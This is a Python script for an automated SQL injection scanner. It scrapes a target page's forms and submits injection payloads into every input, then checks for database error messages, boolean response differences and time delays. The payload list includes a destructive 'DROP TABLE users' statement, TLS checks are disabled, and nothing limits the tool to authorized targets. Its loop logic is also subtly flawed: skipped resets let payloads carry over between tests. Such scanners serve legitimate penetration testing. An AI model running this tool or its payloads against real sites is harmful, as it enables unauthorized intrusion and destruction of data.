import requests
from bs4 import BeautifulSoup
from typing import Dict, List, Any
from urllib.parse import urljoin, parse_qs, urlparse
import difflib
import re
import time
from concurrent.futures import ThreadPoolExecutor

class SQLiScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False  # For testing purposes
        self.results = {
            'forms_tested': [],
            'vulnerabilities': [],
            'payloads_tested': 0
        }

    def detect_forms(self) -> List[Dict[str, Any]]:
        """Detect forms in the target webpage"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []

            for form in soup.find_all('form'):
                action = form.get('action', '')
                # Don't join if action is already absolute
                if action and not action.startswith(('http://', 'https://')):
                    action = action.lstrip('/')  # Remove leading slash if present
                
                form_info = {
                    'action': action,
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }

                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('type') not in ['submit', 'button', 'image']:
                        form_info['inputs'].append({
                            'name': input_field.get('name', ''),
                            'type': input_field.get('type', 'text')
                        })

                forms.append(form_info)
            return forms
        except Exception as e:
            print(f"Error detecting forms: {str(e)}")
            return []

    def generate_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL,NULL,NULL-- -",
            "' UNION SELECT @@version,NULL,NULL-- -",
            "1' AND SLEEP(5)-- -",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
            "' OR EXISTS(SELECT 1 FROM users)-- -",
            "' HAVING 1=1 --",
            "' GROUP BY columnname HAVING 1=1 --",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "admin' AND '1'='1",
            "'; DROP TABLE users--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ]

    def test_error_based_injection(self, path: str, data: Dict[str, str]) -> Dict[str, Any]:
        """Test for error-based SQL injection vulnerabilities"""
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql",
            r"Driver.* SQL[-_ ]*Server",
            r"OLE DB.* SQL Server",
            r"SQL Server.*Driver",
            r"SQL Server.*[0-9a-fA-F]{8}",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Exception.*\[Microsoft\]\[SQL Server\]",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Warning.*ora_",
            r"ORA-[0-9][0-9][0-9][0-9]"
        ]

        try:
            url = urljoin(self.target_url, path)
            response = self.session.post(url, data=data)

            # Check for SQL errors in response
            for pattern in error_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return {
                        'vulnerable': True,
                        'type': 'error_based',
                        'evidence': match.group(0),
                        'payload': str(data)
                    }

            return {'vulnerable': False}
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def test_boolean_based_injection(self, path: str, data: Dict[str, str]) -> Dict[str, Any]:
        """Test for boolean-based SQL injection vulnerabilities"""
        try:
            url = urljoin(self.target_url, path)
            # Send true condition
            true_data = data.copy()
            for key in true_data:
                true_data[key] = f"{true_data[key]} AND '1'='1"
            true_response = self.session.post(url, data=true_data)

            # Send false condition
            false_data = data.copy()
            for key in false_data:
                false_data[key] = f"{false_data[key]} AND '1'='2"
            false_response = self.session.post(url, data=false_data)

            # Compare responses
            if true_response.status_code != false_response.status_code:
                return {
                    'vulnerable': True,
                    'type': 'boolean_based',
                    'evidence': f"Different status codes: {true_response.status_code} vs {false_response.status_code}",
                    'payload': str(true_data)
                }

            # Compare response content
            difference_ratio = difflib.SequenceMatcher(None, true_response.text, false_response.text).ratio()
            if difference_ratio < 0.95:  # Responses are significantly different
                return {
                    'vulnerable': True,
                    'type': 'boolean_based',
                    'evidence': f"Different responses detected (similarity: {difference_ratio:.2f})",
                    'payload': str(true_data)
                }

            return {'vulnerable': False}
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def test_time_based_injection(self, path: str, data: Dict[str, str]) -> Dict[str, Any]:
        """Test for time-based SQL injection vulnerabilities"""
        try:
            url = urljoin(self.target_url, path)
            start_time = time.time()
            payload = "'; SELECT SLEEP(5)-- -"
            
            test_data = data.copy()
            for key in test_data:
                test_data[key] = f"{test_data[key]}{payload}"

            response = self.session.post(url, data=test_data)
            execution_time = time.time() - start_time

            if execution_time >= 5:
                return {
                    'vulnerable': True,
                    'type': 'time_based',
                    'evidence': f"Request took {execution_time:.2f} seconds",
                    'payload': str(test_data)
                }

            return {'vulnerable': False}
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def run_scan(self) -> Dict[str, Any]:
        """Run full SQL injection scan"""
        forms = self.detect_forms()
        self.results['forms_tested'] = []
        total_payloads = 0

        for form in forms:
            form_results = {
                'url': form['action'],
                'method': form['method'],
                'vulnerabilities': []
            }

            # Generate test data
            test_data = {}
            for input_field in form['inputs']:
                test_data[input_field['name']] = 'test'

            # Test each payload
            for payload in self.generate_payloads():
                total_payloads += 1
                
                # Test each input field
                for input_field in form['inputs']:
                    test_data[input_field['name']] = payload
                    
                    # Run different types of tests
                    error_result = self.test_error_based_injection(form['action'], test_data)
                    if error_result['vulnerable']:
                        form_results['vulnerabilities'].append(error_result)
                        continue

                    boolean_result = self.test_boolean_based_injection(form['action'], test_data)
                    if boolean_result['vulnerable']:
                        form_results['vulnerabilities'].append(boolean_result)
                        continue

                    time_result = self.test_time_based_injection(form['action'], test_data)
                    if time_result['vulnerable']:
                        form_results['vulnerabilities'].append(time_result)

                    # Reset test data
                    test_data[input_field['name']] = 'test'

            self.results['forms_tested'].append(form_results)

        self.results['payloads_tested'] = total_payloads
        return self.results